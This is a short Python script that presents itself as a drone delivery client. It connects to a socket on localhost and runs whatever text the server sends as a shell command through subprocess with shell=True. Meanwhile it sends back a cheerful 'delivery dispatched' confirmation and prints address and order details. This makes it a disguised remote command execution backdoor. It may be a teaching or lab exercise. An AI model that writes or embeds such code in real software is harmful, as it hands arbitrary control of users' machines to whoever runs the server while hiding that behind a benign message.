import socket
import os
import subprocess

s = socket.socket()
host = '127.0.0.1'
port = 9399

s.connect((host, port))


data = s.recv(1024)
while True:
    if len(data) > 0:
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        output_str = 'Thank you! Delivery details have been received! The drone has been dispatched for delivery!'
        s.send(str.encode(output_str))
        data = s.recv(1024)
        adds = data.decode("utf-8")
        print(adds)
        s.send("Address recieved".encode())
        data = s.recv(1024)
        ords = data.decode("utf-8")
        print(ords)
        s.send(("order id recieved").encode())
        print(output_str)

